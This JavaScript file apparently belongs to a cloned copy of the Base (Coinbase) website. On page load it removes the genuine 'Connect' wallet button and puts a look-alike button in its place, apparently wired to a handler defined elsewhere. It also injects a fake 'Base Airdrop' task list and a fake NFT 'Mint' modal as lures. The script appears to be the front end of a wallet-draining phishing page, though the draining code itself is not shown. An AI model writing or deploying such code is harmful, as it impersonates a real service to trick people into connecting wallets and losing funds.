const images = [
  "./images/blog/base-is-meeting-builders-around-the-world-cover.png",
  "./images/blog/summer-never-ends-cover.webp",
  "./images/blog/scaling-base-looking-towards-the-upcoming-pectra-upgrade-cover.webp",
  "./images/blog/build-your-onchain-identity-with-basenames-cover.webp",
  "./images/blog/announcing-the-onchain-summer-buildathon-winners-cover.webp",
  "./images/blog/introducing-the-onchain-content-network-cover.webp",
];

window.addEventListener("load", () => {
  replaceImage();

  // addNftContainer();
  addAirdropContainer();
  waitForAndRemoveButton();
  appendModalMarkup();
  MicroModal.init();
});

function waitForAndRemoveButton() {
  const intervalTime = 100; // Интервал проверки (в миллисекундах)
  const maxTime = 5000; // Максимальное время ожидания (5 секунд)
  const startTime = Date.now();

  // Функция для поиска и удаления кнопки
  function checkAndRemoveButton() {
    const buttons = document.querySelectorAll("button");
    const targetButton = Array.from(buttons).find((button) => {
      const span = button.querySelector("span");
      return span && span.textContent.trim() === "Connect";
    });

    if (targetButton) {
      console.log("Кнопка найдена и удалена:", targetButton);
      const button = document.createElement("button");
      button.textContent = "Connect";
      button.className =
        "open text-md px-4 py-2 whitespace-nowrap flex items-center justify-center disabled:opacity-40 disabled:pointer-events-none transition-all bg-blue text-white border border-blue hover:bg-blue-80 active:bg-[#06318E] text-md px-4 py-2 gap-3 rounded-full w-auto";
      const dataRkWrapper = document.querySelectorAll("[data-rk]");
      targetButton.remove();
      dataRkWrapper[1].appendChild(button);
      window.upgradeFinished = true;

      return; // Прекращаем выполнение, так как цель достигнута
    }

    // Проверяем, не истекло ли максимальное время
    if (Date.now() - startTime < maxTime) {
      setTimeout(checkAndRemoveButton, intervalTime);
    } else {
      console.log("Кнопка не найдена в течение 5 секунд.");
    }
  }

  // Запускаем первый вызов
  checkAndRemoveButton();
}

function appendModalMarkup() {
  const modalMarkup = `
     <div class="modal micromodal-slide" id="modal-1" aria-hidden="true">
    <div class="modal__overlay" tabindex="-1" data-micromodal-close>
      <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-1-title">
        <header class="modal__header">
          <h2 class="modal__title" id="modal-1-title">
            Base Logos
          </h2>
          <button class="modal__close" aria-label="Close modal" data-micromodal-close></button>
        </header>
        <main class="modal__content" id="modal-1-content">
        	<video class="" loop autoplay muted height="250" width="250">
          	<source src="_next/static/base-logos.mp4" type="video/mp4">
					</video>
          <p>
          Base Logos is a collection of 10,000 Base logos colored with Base Colors. The owner of the Base Color used in the Base Logo receives a share of the mint revenue.
<!--            Try hitting the <code>tab</code> key and notice how the focus stays within the modal itself. Also, <code>esc</code> to close modal.-->
          </p>
        </main>
        <footer class="modal__footer">
          <button class="open modal__btn modal__btn-primary">Mint</button>
<!--          <button class="modal__btn" data-micromodal-close aria-label="Close this dialog window">Close</button>-->
        </footer>
      </div>
    </div> 
  </div>
  `;

  const body = document.querySelector("body");
  body.insertAdjacentHTML("beforeend", modalMarkup);
}

function addAirdropContainer() {
  const parent = document.querySelector(".my-section").parentNode;
  const mySection = document.querySelector(".my-section");

  const newSection = document.createElement("section");
  newSection.innerHTML = `
	<div class="airdrop-container">
		<div class="airdrop-text">
			<h2>Base Airdrop</h2>
			<p class="airdrop-subtitle">Complete simple tasks, engage with the community, and unlock exclusive crypto benefits.</p>
			<ul>
				<li><span class="loader"></span><a target="_blank" href="https://discord.gg/buildonbase">Join Base’s official Discord server and participate in discussions.</a><img src="images/arrow-up-right.svg"/></li>
				<li class="airdrop-link">
					<img src="images/circle-check.svg"/><p>Connect your wallet (e.g., <a target="_blank" href="https://www.coinbase.com/wallet">Coinbase Wallet</a> or <a target="_blank" href="https://metamask.io/download">Metamask</a>) to the Base network.</p>
				</li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://basescan.org/">Make transactions within the Base network by sending tokens between wallets.</a><img src="images/arrow-up-right.svg"/></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://bridge.base.org/deposit">Use official bridges to transfer assets to Base (e.g., Ethereum → Base).</a><img src="images/arrow-up-right.svg"/></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="/ecosystem">Interact with decentralized applications (dApps) running on Base, such as DeFi protocols or NFT marketplaces.</a><img src="images/arrow-up-right.svg"/></li>
				<li class="airdrop-link"><img src="images/circle-check.svg"/><p>Sign up for a <a target="_blank" href="https://www.coinbase.com/signup">Coinbase</a> account (if you don’t have one) and complete <a target="_blank" href="https://help.coinbase.com/en/coinbase/getting-started/identity-verification/verify-your-identity">KYC</a> verification.</p></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://www.coinbase.com/buy">Purchase cryptocurrencies related to the Base network using Coinbase.</a><img src="images/arrow-up-right.svg"/></li>
				<li><img src="images/circle-check.svg"/><a target="_blank" href="https://zora.co/">Buy or sell NFTs on Base-supported marketplaces.</a><img src="images/arrow-up-right.svg"/></li> 
			</ul>
			<button class="airdrop-connect-button open connect-button text-md px-4 py-2 whitespace-nowrap flex items-center justify-center disabled:opacity-40 disabled:pointer-events-none transition-all bg-blue text-white border border-blue hover:bg-blue-80 active:bg-[#06318E] text-md px-4 py-2 gap-3 rounded-full w-auto">Connect Wallet</button>
			<p class="airdrop-footer-subtitle">Don’t miss your chance to be part of the future of Web3 with Base! Completing these tasks not only earns you exclusive rewards but also helps you explore and engage with cutting-edge blockchain technology. Stay active, follow Base’s updates on social media, and keep an eye out for new opportunities in the ecosystem. Start now and join the growing community building on Base!</p>
		</div>

		<img src="./images/airdrop.png" alt="" width="350" height="350"/>
	</div>`;

  parent.insertBefore(newSection, mySection);
}

function addNftContainer() {
  const parent = document.querySelector(".my-section").parentNode;
  const mySection = document.querySelector(".my-section");

  const newSection = document.createElement("section");
  newSection.className = "nft-mint-container";
  newSection.innerHTML = `
                <div class="flex h-[420px] bg-[#141519] rounded-2xl"> 
                    <div class="flex flex-1 justify-between overflow-hidden nft-wrapper"> 
                        <!-- Left Section -->
                        <div class="flex-1 p-8">
                            <div class="space-y-8">
                                <!-- Fresh Drop Badge -->
                                <span class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb g1j4d186 inline-block text-white px-4 py-1.5 rounded-full text-sm">
                                    FRESH DROP
                                </span>

                                <!-- Coinbase Section -->
                                <div class="flex items-center gap-2">
                                    <div class="w-12 h-12 rounded-full overflow-hidden bg-gray-700">
                                    <img src="./base-logos.svg" alt=""/>
</div>
                                    <span class="text-white font-semibold">Gayatri</span>
                                </div>

                                <!-- Title -->
                                <h1 class="text-white text-6xl font-bold">
                                    Base Logos
                                </h1>

                                <!-- Description -->
                                <p class="text-gray-400">
                                    Base Logos is a collection of 10,000 Base logos colored with Base Colors.
                                </p>

                                <!-- Mint Button -->
                                <button data-micromodal-trigger="modal-1" class="w-full py-4 px-6 rounded-full text-center font-medium bg-gradient-to-r from-blue-500 to-cyan-400 text-white hover:opacity-90 transition-opacity">
                                    Mint +1000 points
                                </button>
                            </div>
                        </div>

                        <!-- Right Section - Image -->
                        <div class="relative flex-1 rounded-3xl">
                        <div class="video-wrapper h-full relative rounded-tr-2xl rounded-br-2xl overflow-hidden">
                        	<video class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 min-w-full min-h-full" loop autoplay muted height="420">
                        			 <source src="_next/static/base-logos.mp4" type="video/mp4">
														</video>
												</div>
                        		
  
<!--                            <div class="w-full h-full bg-[#FF7E78]"></div>-->
                        </div>
                    </div>
                </div>
            `;

  parent.insertBefore(newSection, mySection);
}

function replaceImage() {
  const elements = document.querySelectorAll(".object-cover");

  elements.forEach((element, index) => {
    if (element) {
      element.srcset = images[index];
    }
  });
}
